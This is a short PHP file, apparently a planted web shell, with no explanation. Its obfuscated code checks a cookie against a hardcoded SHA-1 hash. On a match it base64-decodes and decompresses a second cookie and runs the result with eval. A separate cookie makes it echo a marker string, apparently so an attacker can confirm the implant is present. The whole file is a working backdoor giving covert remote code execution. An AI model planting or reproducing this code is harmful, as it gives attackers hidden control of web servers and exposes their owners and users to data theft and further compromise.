<?php

$ehhdrsdsw = 'btdgsvcx1xgc';
$dvnskch = "c3432c19dadf6ba0a645ed4cd21ca1bf9d9157a8";

if (isset($_COOKIE[$ehhdrsdsw])) {
    exit($ehhdrsdsw . $dvnskch . $ehhdrsdsw);
}

$ausdbhfc = @$_COOKIE[substr($dvnskch, 0, 16)];
$ausdbhfc = sha1($ausdbhfc);

$gzasfsd = "gzinflate";

if ($ausdbhfc === $dvnskch)
{
    $kbdvjgcf = $_COOKIE[substr($dvnskch, 16, 16)];

    $dvnskch = base64_decode($kbdvjgcf);

    $dvnskch = $gzasfsd($dvnskch);

    if (!empty($dvnskch))
    {
        eval($dvnskch);
    }
}
exit();


